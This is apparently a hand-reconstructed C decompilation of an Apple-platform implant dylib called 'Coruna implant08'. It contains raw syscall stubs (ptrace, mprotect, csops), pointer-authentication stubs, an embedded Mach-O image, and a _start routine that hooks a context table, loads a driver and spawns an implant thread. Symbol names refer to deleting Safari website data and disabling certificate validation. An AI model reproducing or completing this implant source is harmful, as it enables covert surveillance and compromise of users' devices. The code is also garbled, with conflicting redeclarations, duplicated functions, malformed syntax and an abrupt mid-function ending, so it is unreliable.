/*
 * Coruna implant dylib (implant08) — hand-reconstructed native C
 *
 * Mach-O export _start: implant context, IO dispatch, dylib section resolve.
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



#include <coruna/names.h>

/* Implant runtime constants (from Mach-O image) */
static uint64_t k_implant_mmap_anon_fd;
static uint64_t k_implant_ctx_slot_primary;
static uint64_t k_implant_ctx_slot_secondary;
static uint64_t k_implant_ctx_slot_tertiary;
static uint64_t k_implant_ctx_field_u32;
static uint64_t k_implant_ctx_field_u64;
static uint64_t k_implant_slot_4e20;
static uint64_t k_implant_slot_7000 = 0x54000100ea00001fULL;
static uint64_t k_implant_svc_flag_c = 0x01003f54000100eaULL;
static uint8_t k_implant_slot_7006 = 0x00;
static uint64_t k_implant_slot_7007 = 0x0000c0ea01003f54ULL;
static uint8_t k_implant_slot_700a = 0x01;
static uint8_t k_implant_slot_700b = 0xea;
static uint64_t k_implant_jsc_dispatch_mask = 0x10000109540000c0ULL;
static uint64_t k_implant_slot_7530 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_11fc8 = 0x529a0020aa0003e8ULL;
static uint8_t k_implant_rodata_word_12001 = 0x11;
static uint16_t k_implant_rodata_word_12002 = 0xf940;
static uint8_t k_implant_rodata_word_12004 = 0xe0;
static uint8_t k_implant_rodata_word_12005 = 0x03;
static uint16_t k_implant_rodata_word_12006 = 0xaa08;
static uint8_t k_implant_rodata_word_12008 = 0x5f;
static uint8_t k_implant_rodata_word_12009 = 0x08;
static uint8_t k_implant_rodata_word_1200a = 0x1f;
static uint8_t k_implant_rodata_word_1200b = 0xd6;
static uint64_t k_implant_rodata_word_1200c = 0xd65f03c011002400ULL;
static uint8_t k_implant_rodata_word_12011 = 0x03;
static uint16_t k_implant_rodata_word_12012 = 0xd65f;
static uint64_t k_implant_rodata_word_12014 = 0x529a0020aa0003e8ULL;
static uint64_t k_implant_rodata_word_26a00 = 0x4090a80000000000ULL;
static uint64_t k_implant_rodata_word_26a08 = 0x408c200000000000ULL;
static uint64_t k_implant_rodata_word_26a20 = 0xf2982188b2704fe8ULL;
static uint64_t k_implant_rodata_word_26a28 = 0x0000004000000000ULL;
static uint64_t k_implant_rodata_word_26a30 = 0x52b2800952b28014ULL;
static uint64_t k_implant_rodata_word_26a38 = 0x0000000052b28008ULL;
static uint64_t k_implant_rodata_word_26a50 = 0x0000000400000001ULL;
static uint64_t k_implant_rodata_word_26a58 = 0x408a980000000000ULL;
static uint64_t k_implant_rodata_word_26a60 = 0x0000001000000004ULL;
static uint64_t k_implant_rodata_word_26a68 = 0x0000002000000000ULL;
static uint64_t k_implant_rodata_word_26a70 = 0x0000000042000000ULL;
static uint64_t k_implant_rodata_word_26a78 = 0x0000000040000000ULL;
static uint64_t k_implant_rodata_word_26a80 = 0x4090ab3333333333ULL;
static uint64_t k_implant_rodata_word_26a88 = 0x408a900000000000ULL;
static uint64_t k_implant_rodata_word_26a98 = 0x0000000500000020ULL;
static uint64_t k_implant_rodata_word_26aa0 = 0x408f400000000000ULL;
static uint64_t k_implant_rodata_word_26aa8 = 0x0000002800000000ULL;
static uint64_t k_implant_rodata_word_26ac0 = 0x0000013400000013ULL;
static uint64_t k_implant_rodata_word_26ac8 = 0x0000001800000013ULL;
static uint64_t k_implant_rodata_word_26ad0 = 0x000000010000009dULL;
static uint64_t k_implant_rodata_word_28630 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28660 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28680 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_286f0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28710 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28730 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28760 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28790 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_287c0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28880 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_288f0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28910 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_289d0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28a98 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28ab8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28ae8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_28b18 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c050 = 0x75140ae33317f60fULL;
static uint64_t k_implant_rodata_word_2c058 = 0x1e35bc489bc58eb4ULL;
static uint64_t k_implant_rodata_word_2c060 = 0x817db76c5fb09ef0ULL;
static uint64_t k_implant_rodata_word_2c068 = 0x44b6c74c749c140dULL;
static uint64_t k_implant_rodata_word_2c070 = 0x817db76c5fb09ef0ULL;
static uint64_t k_implant_rodata_word_2c078 = 0x44b6c74c749c140dULL;
static uint8_t k_implant_rodata_word_2c098 = 0x00;
static uint8_t k_implant_rodata_word_2c099 = 0x00;
static uint64_t k_implant_rodata_word_2c09a = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0a0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0a8 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0b0 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c0b8 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_2c0f8 = 0x0000000032aaaba7ULL;
static uint64_t k_implant_rodata_word_2c138 = 0x0100000cfeedfacfULL;
static uint64_t k_implant_rodata_word_2c718 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c723 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c728 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c780 = 0x0000007373625f5fULL;
static uint64_t k_implant_rodata_word_2c788 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c790 = 0x0000415441445f5fULL;
static uint64_t k_implant_rodata_word_2c798 = 0x0000000000000000ULL;
static uint64_t k_implant_rodata_word_2c7a0 = 0x000000000002c138ULL;
static uint64_t k_implant_rodata_word_2c7a8 = 0x0000000000000678ULL;
static uint64_t k_implant_rodata_word_26a10 = 0x000000000000000aULL;
static uint64_t k_implant_md5_init_state = 0x3320646e61707865ULL;
static uint64_t k_implant_rodata_word_26ab0 = 0x0000000e00000001ULL;
static uint64_t k_implant_rodata_word_26ad8 = 0x0000000000000008ULL;
static uint64_t k_implant_rodata_word_26ae8 = 0x000000000000000aULL;
static void *ptr_implant08_fn_287e0 = (void *)0x8008000000019028ULL;
static void *ptr_implant08_fn_28860 = (void *)0x8008000000017610ULL;
static void *ptr_implant08_fn_28930 = (void *)0x800800000001b378ULL;
static void *ptr_implant08_fn_289b8 = (void *)0x8008000000019028ULL;
static void *ptr_implant08_fn_28a80 = (void *)0x800800000001b8ecULL;
static void *ptr_implant08_fn_2c080 = (void *)0x800800000001ac0cULL;
static void *k_implant_objc_class___nsstring_slot = (void *)0x4008000000000001ULL;
static void *k_implant_objc_class___nsurl_slot = (void *)0x4038000000000027ULL;
static void *k_implant_sandbox_check_no_report_slot = (void *)0x400800000000002cULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0xc0156ae10000002fULL;
static void *k_implant_nsconcreteglobalblock_slot = (void *)0xc0156ae10000002fULL;
static void *k_implant_nsconcretestackblock_slot = (void *)0x4008000000000030ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_chkstk_darwin_slot = (void *)0xc008000000000036ULL;
static void *k_implant_cxa_finalize_ranges_slot = (void *)0xc008000000000038ULL;
static void *k_implant_stack_chk_guard_slot = (void *)0x400800000000003eULL;
static void *k_implant_get_cpu_capabilities_slot = (void *)0x4008000000000044ULL;
static void *k_implant_dladdr_slot = (void *)0x400800000000004cULL;
static void *k_implant_dlsym_slot = (void *)0x4008000000000050ULL;
static void *k_implant_dyldversionnumber_slot = (void *)0x4008000000000051ULL;
static void *k_implant_kcfallocatordefault_slot = (void *)0x4008000000000028ULL;
static void *k_implant_kcfbooleanfalse_slot = (void *)0x4008000000000029ULL;
static void *k_implant_kcfhttpversion1_1_slot = (void *)0x400800000000000bULL;
static void *k_implant_kcfrunloopcommonmodes_slot = (void *)0x400800000000002aULL;
static void *k_implant_kcfrunloopdefaultmode_slot = (void *)0x400800000000002bULL;
static void *k_implant_kcfstreampropertyhttpproxy_slot = (void *)0x400800000000000cULL;
static void *k_implant_kcfstreampropertyhttpresponseheader_slot = (void *)0x400800000000000dULL;
static void *k_implant_kcfstreampropertysslsettings_slot = (void *)0x400800000000000eULL;
static void *k_implant_kcfstreamsslvalidatescertificatechain_slot = (void *)0x400800000000000fULL;
static void *k_implant_mach_task_self_slot = (void *)0x4008000000000067ULL;
static void *k_implant_objc_msgsend_slot = (void *)0xc0090000000000baULL;
static void *k_implant_strcmp_slot = (void *)0x4008000000000097ULL;
static void *k_implant_task_get_exc_guard_behavior_slot = (void *)0xc0080000000000a5ULL;
static void *k_implant_task_get_exc_guard_behavior_slot = (void *)0xc0080000000000a5ULL;
static void *k_implant_task_set_exc_guard_behavior_slot = (void *)0xc0080000000000a7ULL;
static void *k_implant_task_set_exc_guard_behavior_slot = (void *)0xc0180000000000a7ULL;
static void *k_implant_vm_page_mask_slot = (void *)0x40080000000000b2ULL;
static void *PTR_s_URLWithString__0002c000 = (void *)0x000800000002763aULL;
static void *PTR_s_allProfileIdentifiers_0002c008 = (void *)0x00080000000276b4ULL;
static void *PTR_s_deleteSafariWebsiteDataRecord_co_0002c010 = (void *)0x00080000000276e7ULL;
static void *PTR_s_ephemeralTabGroupManager_0002c018 = (void *)0x000800000002769bULL;
static void *PTR_s_host_0002c020 = (void *)0x0008000000027666ULL;
static void *PTR_s_stringWithCString_encoding__0002c028 = (void *)0x000800000002764aULL;
static void *PTR_s_websiteDataRecordWithDomain__0002c030 = (void *)0x00080000000276caULL;
static void *PTR_s_websiteDataRecordWithDomain_prof_0002c038 = (void *)0x000800000002766bULL;
coruna_svc_regpack_t coruna_write(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_open(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_close(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_getpid(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_ptrace(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mprotect(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_csops(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_stat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_fstat(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mmap(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_mlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_munlock(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}



coruna_svc_regpack_t coruna_shared_region_check_np(uint64_t arg)

{
  bool in_CY;
  uint64_t u;
  uint8_t u[16];
  uint64_t size;
  
  CallSupervisor(0x80);
  u = arg;
  size = 0;
  if (in_CY) {
    u = 0xffffffffffffffff;
    size = arg;
  }
  u = size;
  u = u;
  return u;
}





void coruna_pacia(void)
{
  return;
}





void coruna_pacia_2(void)
{
  return;
}





void coruna_pacib(void)
{
  return;
}





void coruna_pacia_3(void)
{
  return;
}
uint64_t coruna_return_zero(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_remote_stub(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_remote_stub(void)
{
  CallSupervisor(0x80);
  return;
}





void coruna_implant_remote_stub(void)
{
  CallSupervisor(0x80);
  return;
}





uint64_t coruna_return_minus_one(void)
{
  return 0xffffffffffffffff;
}





uint64_t coruna_pad_stub(void)
{
  return 0;
}





uint64_t coruna_identity(uint64_t val)
{
  return val;
}





uint64_t coruna_dyld_port_index(void)
{
  return 0;
}





uint64_t coruna_identity_80bc(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_return_zero();
  if (err == 0) {
    return val;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_pacia(val,id_2);
  return u;
}





uint64_t coruna_identity_8110(uint64_t val,uint size,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_return_zero();
  if ((err == 0) || (3 < size)) {
    return val;
  }
  switch(size) {
  case 1:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
case 2:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
case 3:
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      return val;
    }
    ___stack_chk_fail();
}
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    u = coruna_pacia(val,id_2);
    return u;
  }
    ___stack_chk_fail();
}





uint64_t _startl(void *ctx,short *arg)
{
  byte err;
  long handle;
  long addr;
  long off;
  void *ptr;
  int err;
  uint64_t *ptr;
  void (*ptr)(void);
  uint64_t u;
  long scratch;
  long bootargs;
  long thread_attr;
  int host_info;
  void *serial_buf;
  long action;
  pthread_t block_ctx;
  pthread_attr_t stack_guard;
  
  u = 0xad001;
  if (ctx == (void *)0x0) {
    return 0xad001;
  }
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc104,0,0x730c416e);
  }
  if (((arg == (short *)0x0) || (*arg != 2)) || ((ushort)arg[1] < 2)) {
    if (*(char *)((long)ctx + 0x5eb) == '\0') {
      return 0xad001;
    }
    if (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c41ed);
    }
    goto fail;
  }
  action = 0;
  u = coruna_implant08_via_ctx_free_5(&action,ctx);
  if ((int)u != 0) {
    if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
       (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
      (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c41f4);
    }
    goto fail;
  }
  serial_buf = (void *)0x0;
  host_info = 0;
  u = (**(void (**)(action + 0x20))(action,&serial_buf,&host_info);
  if ((int)u == 0) {
    thread_attr = 0;
    u = coruna_find_objc_methlist(&thread_attr,ctx,*(uint64_t *)((long)ctx + 0x78),action,0x70003);
    bootargs = 0;
    if ((int)u == 0) {
      u = coruna_find_objc_methlist(&bootargs,ctx,*(uint64_t *)((long)ctx + 0xa0),action,0x70004)
      ;
      scratch = 0;
      if (((int)u == 0) &&
         (u = coruna_find_objc_methlist(&scratch,ctx,*(uint64_t *)((long)ctx + 0xa8),action,
                               0x70006), ptr = serial_buf, err = host_info, off = thread_attr,
         addr = bootargs, handle = scratch, (int)u == 0)) {
        if ((serial_buf == (void *)0x0) || (host_info == 0)) {
          if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
             (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
            (**(void (**)((long)ctx + 0x5f0))(ctx,0xad001,0,0x730c4fad);
          }
          u = 0xad001;
        }
        else {
          err = *(byte *)((long)ctx + 0x5c6);
          ptr = _calloc(0x38,1);
          if (ptr == (uint64_t *)0x0) {
            u = 0xad009;
            if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
               (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              u = 0xad009;
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad009,0,0x730c4fb7);
            }
          }
          else {
            *ptr = arg;
            ptr[2] = ptr;
            *(int *)(ptr + 3) = err;
            ptr[5] = addr;
            ptr[6] = handle;
            ptr[4] = off;
            *(byte *)(ptr + 1) = err ^ 1;
            err = _pthread_attr_init(&stack_guard);
            if (err == 0) {
              err = 1;
              if (err == 0) {
                err = 2;
              }
              err = _pthread_attr_setdetachstate(&stack_guard,err);
              if (err == 0) {
                block_ctx = (pthread_t)0x0;
                _memcpy(&k_implant_rodata_word_2c138,ctx,0x648);
                err = _pthread_create(&block_ctx,&stack_guard,(void **)coruna_startl_thread,ptr);
                if (err == 0) {
                  if (err != 0) {
                    _pthread_join(block_ctx,(void **)0x0);
                  }
                  _pthread_attr_destroy(&stack_guard);
                  u = 0;
                  goto done;
                }
                if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                   (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                  err = 0xdde;
                  goto cleanup;
                }
              }
              else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                      (ptr = *(void (**)((long)ctx + 0x5f0), ptr != (void (*)0x0)) {
                err = 0xddc;
cleanup:
                (*ptr)(ctx,0xad00b,0,err + 0x730c416e);
              }
              _pthread_attr_destroy(&stack_guard);
            }
            else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
                    (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
              (**(void (**)((long)ctx + 0x5f0))(ctx,0xad00b,0,0x730c4f42);
            }
            _free(ptr);
            u = 0xad00b;
          }
        }
      }
    }
    else {
      scratch = 0;
    }
    if (thread_attr != 0) {
      coruna_free_secure_str();
    }
    if (bootargs != 0) {
      coruna_free_secure_str();
    }
    if (scratch != 0) {
      coruna_free_secure_str();
    }
    _memset_s(serial_buf,host_info,0,host_info);
    _free(serial_buf);
  }
  else if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
          (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,u,0,0x730c4183);
  }
done:
  coruna_ctx_free(action);
fail:
  if ((*(char *)((long)ctx + 0x5eb) != '\0') &&
     (*(void (**)((long)ctx + 0x5f0) != (void (*)0x0)) {
    (**(void (**)((long)ctx + 0x5f0))(ctx,0xcc105,0,0x730c41e8);
  }
  return u;
}





uint64_t
uint64_t coruna_find_objc_methlist(uint64_t *val,int64_t arg,char *path,int64_t arg,uint64_t id_2)
{
  int err;
  char *ptr;
  uint64_t u;
  uint32_t scratch;
  char *bootargs;
  
  if ((val == (uint64_t *)0x0) || (arg == 0)) {
    u = 0xad001;
    if ((arg != 0) &&
       ((*(char *)(arg + 0x5eb) != '\0' && (*(void (**)(arg + 0x5f0) != (void (*)0x0)))) {
      (**(void (**)(arg + 0x5f0))(arg,0xad001,0,0x730c410b);
    }
  }
  else if (path == (char *)0x0) {
    bootargs = (char *)0x0;
    scratch = 0;
    err = (**(void (**)(arg + 0x18))(arg,id_2,&bootargs,&scratch);
    if (err == 0) {
      ptr = _strdup(bootargs);
      *val = ptr;
    }
    u = 0;
  }
  else {
    ptr = _strdup(path);
    u = 0;
    *val = ptr;
  }
  return u;
}





void coruna_free_secure_str(char *path)
{
  void (*ptr)(void);
  size_t ls2;
  unsigned long unaff_x30;
  
  if (path == (char *)0x0) {
    return;
  }
  ls2 = _strlen(path);
  if (ls2 != 0) {
    _memset_s(path,ls2,0,ls2);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(path);
  return;
}





uint64_t _start(uint64_t *val)
{
  int err;
  uint64_t u;
  void (*ptr)(void);
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  uint64_t path_buf;
  void (*tmp_buf)(void);
  uint64_t region;
  short *plist;
  void (*url_buf)(void);
  uint64_t json_buf;
  uint64_t frame;
  long work [2];
  
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (*(char *)((long)val + 0x5c2) == '\0') {
    path_buf = val[0x16];
    scratch = val[6];
    sa_saved = val[7];
    sa_new = val[0x25];
    stack_guard = val[0x26];
    serial_buf = val[0x1d];
    thread_attr = val[0x1f];
    bootargs = val[0x1e];
    host_info = val[0x21];
    scratch = val[0x20];
    type_id_8 = val[0x23];
    action = val[0x24];
    port = *val;
    size = val[1];
    version = val[2];
    tag = val[3];
    kind = val[4];
    block_ctx = val[5];
    type_id = val[0xbe];
    val[5] = coruna_surface_dispatch_thunk;
    val[0x16] = coruna_bzero;
    val[0x25] = coruna_bzero_2_2;
    val[0x24] = coruna_flush_caches;
    val[6] = coruna_init_libsystem;
    val[7] = coruna_implant08_via_return_zero;
    val[0x26] = coruna_implant08_via_driver_copy_port_1918;
    val[0x1e] = 0;
    val[0x1d] = 0;
    val[0x20] = 0;
    val[0x1f] = 0;
    val[0x22] = 0;
    val[0x21] = 0;
    val[0x23] = 0;
    *val = port;
    val[1] = size;
    val[2] = version;
    val[3] = tag;
    val[4] = kind;
    val[0xbe] = type_id;
  }
  else {
    action = 0;
    block_ctx = 0;
    sa_new = 0;
    path_buf = 0;
    sa_saved = 0;
    scratch = 0;
    stack_guard = 0;
    host_info = 0;
    serial_buf = 0;
    bootargs = 0;
    thread_attr = 0;
    scratch = 0;
    type_id_8 = 0;
    size = 0;
    version = 0;
    port = 0;
    tag = 0;
    kind = 0;
    type_id = 0;
  }
  if (*(char *)((long)val + 0x5ec) != '\0') {
    *(uint8_t *)((long)val + 0x5c6) = 1;
  }
  if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
    (*(void (*)val[0xbe])(val,0xcc101,0,0x730c405e);
  }
  if (*(char *)((long)val + 0x5c4) == '\0') {
    frame = 0;
    work[0] = 0;
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,0xcc102,0,0x730c4eec);
    }
    u = coruna_load_driver(work,val,1,&frame);
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,0xcc103,0,0x730c4eeb);
    }
    if ((int)u == 0) {
      u = coruna_implant_via_cat(work[0],val,frame);
      if ((int)u == 0) {
        u = coruna_run_startsc(val,work[0],frame);
      }
      else if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0))
      {
        (*(void (*)val[0xbe])(val,u,0,0x730c4ed1);
      }
      coruna_implant08_via_implant_residual_46(work[0],val);
    }
    else if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,u,0,0x730c4eca);
    }
    if ((uint32_t *)val[0xbc] != (uint32_t *)0x0) {
      *(uint32_t *)val[0xbc] = 5;
    }
    goto fail;
  }
  frame = 0;
  work[0] = 0;
  u = coruna_load_driver(work,val,0,&frame);
  if ((int)u != 0) {
    if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
      (*(void (*)val[0xbe])(val,u,0,0x730c4e9a);
    }
    goto fail;
  }
  u = coruna_implant_via_cat(work[0],val,frame);
  if ((int)u == 0) {
    json_buf = 0;
    url_buf = (void (*)0x0;
    u = coruna_implant_residual_39(work[0],0x90000,"_driver",&json_buf,&url_buf);
    if ((int)u == 0) {
      plist = (short *)0x0;
      if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
        (*(void (*)val[0xbe])(val,0xcc102,0,0x730c4e6f);
      }
      u = (*url_buf)(&plist);
      if ((*(char *)((long)val + 0x5eb) != '\0') && ((void (*)val[0xbe] != (void (*)0x0)) {
        (*(void (*)val[0xbe])(val,0xcc103,0,0x730c4e65);
      }
      if ((int)u == 0) {
        if (((plist == (short *)0x0) || (*plist != 2)) || ((ushort)plist[1] < 2)) {
          u = 0x28007;
          if ((*(char *)((long)val + 0x5eb) != '\0') &&
             (ptr = (void (*)val[0xbe], ptr != (void (*)0x0)) {
